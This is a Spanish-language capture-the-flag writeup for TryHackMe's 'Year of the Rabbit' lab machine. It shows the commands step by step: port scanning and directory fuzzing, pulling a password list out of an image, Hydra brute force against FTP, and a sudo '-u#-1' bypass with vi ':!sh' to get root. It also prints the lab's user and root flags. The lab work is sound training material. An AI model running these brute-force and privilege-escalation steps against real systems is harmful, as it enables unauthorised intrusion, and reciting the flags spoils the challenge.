# Writeup Year of the Rabbit - TryHackMe

| **Información** | **Detalle** |
| :--- | :--- |
| **IP** | 10.129.135.128 |
| **Plataforma** | TryHackMe |
| **Sistema Operativo** | Linux |
| **Dificultad** | Fácil |

---

## Tabla de Contenidos

1. [Reconocimiento](#reconocimiento)
2. [Enumeración](#enumeración)
3. [Explotación](#explotación)
4. [Escalada de Privilegios](#escalada-de-privilegios)
5. [Flags](#flags)

---

## Reconocimiento

Comenzamos la fase de reconocimiento con un escaneo inicial de puertos para mapear los servicios expuestos:


```bash
sudo nmap -sC -sV -Pn -sS -p- 10.129.135.128 -oN scan_rabbit.txt
```



### Resultados del Escaneo


```bash
21/tcp open  ftp     vsftpd 3.0.2
22/tcp open  ssh     OpenSSH 6.7p1 Debian 5 (protocol 2.0)
| ssh-hostkey: 
|   1024 a0:8b:6b:78:09:39:03:32:ea:52:4c:20:3e:82:ad:60 (DSA)
|   2048 df:25:d0:47:1f:37:d9:18:81:87:38:76:30:92:65:1f (RSA)
|   256 be:9f:4f:01:4a:44:c8:ad:f5:03:cb:00:ac:8f:49:44 (ECDSA)
|_  256 db:b1:c1:b9:cd:8c:9d:60:4f:f1:98:e2:99:fe:08:03 (ED25519)
80/tcp open  http    Apache httpd 2.4.10 ((Debian))
|_http-server-header: Apache/2.4.10 (Debian)
|_http-title: Apache2 Debian Default Page: It works
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

```

Se identifican tres servicios activos: FTP, SSH y HTTP. Iniciamos la inspección del servidor web para determinar el vector de ataque inicial.

Vale, parece ser la página por defecto de Apache en Debian. Vamos a correr GoBuster para ver si hay algo oculto.

![pagina principal](/imgRabbit/image.png)



---

## Enumeración

Al ejecutar el comando de GoBuster, nos encontraremos con una carpeta llamada "assets". Vamos a ver que hay en esa carpeta.


```bash
gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -url  http://[IP_ADDRESS]
Starting gobuster in directory enumeration mode
===============================================================
assets               (Status: 301) [Size: 317] [--> http://10.129.135.128/assets/]
Progress: 46417 / 87662 (52.95%)^C
```

![contenido assets](/imgRabbit/image2.png)

Hay un video de ¿un rickroll? Inesperado. Y un archivo .css irrelevante. Vamos a reiniciar el fuzzing desde la carpeta, a ver si encontramos algo interesante.

```bash
gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -url  http://[IP_ADDRESS]/assets
```

Vale, no ha arrojado ningún resultado, por lo que revisaré sin mucha esperanza el .css de la carpeta.

![contenido css](/imgRabbit/image3.png)

¡Ojito, que se me pasó por alto!, tenemos una carpeta llamada /supersecretflag.php. Vamos a ver que hay en esa carpeta. Nota: Hay que apagar el JavaScript para que funcione el PHP.

El recurso resulta ser otro rickroll; sin embargo, el código fuente sugiere que el vídeo contiene una pista fundamental para progresar.

![rickroll](/imgRabbit/image4.png)

Vale, en el minuto 0:56 del vídeo, nos suelta el tipo un audio diciendo de forma textual: "Te voy a sacar de la miseria, estás buscando en el lugar equivocado *burp*". Por lo que intentaré buscar con gobuster a partir de la carpeta esa.

```bash
gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -url  http://10.129.135.128/sup3r_s3cret_fl4g/ 
```
Como sigo sin encontrar nada, voy a intentar usar Burp Suite para interceptar la petición y ver si hay algo oculto.

![burp suite](/imgRabbit/image5.png)

¡Ojito! El PHP sale que nos redirige a un tal "intermediary.php", que a su vez nos redirige a un tal "/WExYY2Cv-qU". Vamos a ver que hay en esa carpeta.

![carpeta oculta](/imgRabbit/image6.png)

Se localiza la imagen `Hot_Babe.png`. Procedemos a analizarla en busca de datos ocultos mediante técnicas de esteganografía.

```bash
strings Hot_Babe.png
```
Resultados:

```bash
Eh, you've earned this. Username for FTP is ftpuser
One of these is the password:
Mou+56n%QK8sr
1618B0AUshw1M
A56IpIl%1s02u
vTFbDzX9&Nmu?
FfF~sfu^UQZmT
8FF?iKO27b~V0
ua4W~2-@y7dE$
3j39aMQQ7xFXT
Wb4--CTc4ww*-
u6oY9?nHv84D&
0iBp4W69Gr_Yf
TS*%miyPsGV54
C77O3FIy0c0sd
O14xEhgg0Hxz1
5dpv#Pr$wqH7F
1G8Ucoce1+gS5
0plnI%f0~Jw71
0kLoLzfhqq8u&
kS9pn5yiFGj6d
zeff4#!b5Ib_n
rNT4E4SHDGBkl
KKH5zy23+S0@B
3r6PHtM4NzJjE
gm0!!EC1A0I2?
HPHr!j00RaDEi
7N+J9BYSp4uaY
PYKt-ebvtmWoC
3TN%cD_E6zm*s
eo?@c!ly3&=0Z
nR8&FXz$ZPelN
eE4Mu53UkKHx#
86?004F9!o49d
SNGY0JjA5@0EE
trm64++JZ7R6E
3zJuGL~8KmiK^
CR-ItthsH%9du
yP9kft386bB8G
A-*eE3L@!4W5o
GoM^$82l&GA5D
1t$4$g$I+V_BH
0XxpTd90Vt8OL
j0CN?Z#8Bp69_
G#h~9@5E5QA5l
DRWNM7auXF7@j
Fw!if_=kk7Oqz
92d5r$uyw!vaE
c-AA7a2u!W2*?
zy8z3kBi#2e36
J5%2Hn+7I6QLt
gL$2fmgnq8vI*
Etb?i?Kj4R=QM
7CabD7kwY7=ri
4uaIRX~-cY6K4
kY1oxscv4EB2d
k32?3^x1ex7#o
ep4IPQ_=ku@V8
tQxFJ909rd1y2
5L6kpPR5E2Msn
65NX66Wv~oFP2
LRAQ@zcBphn!1
V4bt3*58Z32Xe
ki^t!+uqB?DyI
5iez1wGXKfPKQ
nJ90XzX&AnF5v
7EiMd5!r%=18c
wYyx6Eq-T^9#@
yT2o$2exo~UdW
ZuI-8!JyI6iRS
PTKM6RsLWZ1&^
3O$oC~%XUlRO@
KW3fjzWpUGHSW
nTzl5f=9eS&*W
WS9x0ZF=x1%8z
Sr4*E4NT5fOhS
hLR3xQV*gHYuC
4P3QgF5kflszS
NIZ2D%d58*v@R
0rJ7p%6Axm05K
94rU30Zx45z5c
Vi^Qf+u%0*q_S
1Fvdp&bNl3#&l
zLH%Ot0Bw&c%9

```
¡Perfecto, tenemos usuario de FTP! Ahora, usaremos Hydra para crackear la contraseña y por fin entrar.

```bash
hydra -l ftpuser -P ftp.txt ftp://[IP_ADDRESS]
```

¡Premio! Tenemos la contraseña del usuario FTP.

![contraseña ftp](/imgRabbit/image7.png)

Ahora, entraremos por FTP y veremos que hay.

```bash
ftp [IP_ADDRESS]
```
*(Se descarga el archivo Eli's_Creds.txt)*

Se han localizado las credenciales del usuario "eli". Procedemos a intentar el acceso vía SSH.

```bash
+++++ ++++[ ->+++ +++++ +<]>+ +++.< +++++ [->++ +++<] >++++ +.<++ +[->-
--<]> ----- .<+++ [->++ +<]>+ +++.< +++++ ++[-> ----- --<]> ----- --.<+
++++[ ->--- --<]> -.<++ +++++ +[->+ +++++ ++<]> +++++ .++++ +++.- --.<+
+++++ +++[- >---- ----- <]>-- ----- ----. ---.< +++++ +++[- >++++ ++++<
]>+++ +++.< ++++[ ->+++ +<]>+ .<+++ +[->+ +++<] >++.. ++++. ----- ---.+
++.<+ ++[-> ---<] >---- -.<++ ++++[ ->--- ---<] >---- --.<+ ++++[ ->---
--<]> -.<++ ++++[ ->+++ +++<] >.<++ +[->+ ++<]> +++++ +.<++ +++[- >++++
+<]>+ +++.< +++++ +[->- ----- <]>-- ----- -.<++ ++++[ ->+++ +++<] >+.<+
++++[ ->--- --<]> ---.< +++++ [->-- ---<] >---. <++++ ++++[ ->+++ +++++
<]>++ ++++. <++++ +++[- >---- ---<] >---- -.+++ +.<++ +++++ [->++ +++++
<]>+. <+++[ ->--- <]>-- ---.- ----. <
```
¿Que es esto? Eeeh, no tengo ni idea de que cosa extraña es, así que usaré un decodificador de brainfuck.

![brainfuck](/imgRabbit/image8.png)

---

## Explotación

Ahora que tenemos las credenciales, vamos a entrar en la máquina, y buscar la flag de user.

```bash
eli@10.130.149.112's password: 


1 new message
Message from Root to Gwendoline:

"Gwendoline, I am not happy with you. Check our leet s3cr3t hiding place. I've left you a hidden message there"

END MESSAGE
```
Vale, tenemos un mensaje de Root para Gwendoline, que dice que revisemos nuestro escondite secreto. Vamos a ver que hay en el directorio de Gwendoline.

```bash
locate /s3cr3t
/usr/games/s3cr3t
/usr/games/s3cr3t/.th1s_m3ss4ag3_15_f0r_gw3nd0l1n3_0nly!
```
Interesante, hay un mensaje nuevo del tipo, vamos a leerlo.

```bash
Your password is awful, Gwendoline. 
It should be at least 60 characters long! Not just MniVCQVhQHUNI
Honestly!

Yours sincerely
   -Root

```
¡Perfecto! Tenemos la contraseña de Gwendo. Vamos a introducirla, navegar a su directorio y obtener la flag de user.

```bash
eli@year-of-the-rabbit:/usr/games/s3cr3t$ su gwendoline
Password: [PASSWORD]
gwendoline@year-of-the-rabbit:/$ cd /home/gwendoline/
gwendoline@year-of-the-rabbit:~$ cat user.txt 
THM{1107174691af9ff3681d2b5bdb5740b1589bae53}

```

---

## Escalada de Privilegios

Ahora que tenemos la flag de user, vamos a buscar la de root. Vamos a usar el comando sudo -l para saber si podemos ejecutar algún comando como root.

```bash
Matching Defaults entries for gwendoline on year-of-the-rabbit:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User gwendoline may run the following commands on year-of-the-rabbit:
    (ALL, !root) NOPASSWD: /usr/bin/vi /home/gwendoline/user.txt
```

Al parecer, podemos ejecutar el comando vi como root, pero no directamente. Vamos a usar GTFOBins para obtener la flag de root.

```bash
sudo -u#-1 /usr/bin/vi /home/gwendoline/user.txt
```
En la consola de Vim, introducimos: ":!sh" y nos dará una shell de root.

```bash
gwendoline@year-of-the-rabbit:~$ sudo -u#-1 /usr/bin/vi /home/gwendoline/user.txt  
# whoami
root
# cat /root/root.txt
THM{8d6f163a87a1c80de27a4fd61aef0f3a0ecf9161}
```

---

## Flags

- **User Flag**: THM{1107174691af9ff3681d2b5bdb5740b1589bae53}
- **Root Flag**: THM{8d6f163a87a1c80de27a4fd61aef0f3a0ecf9161}
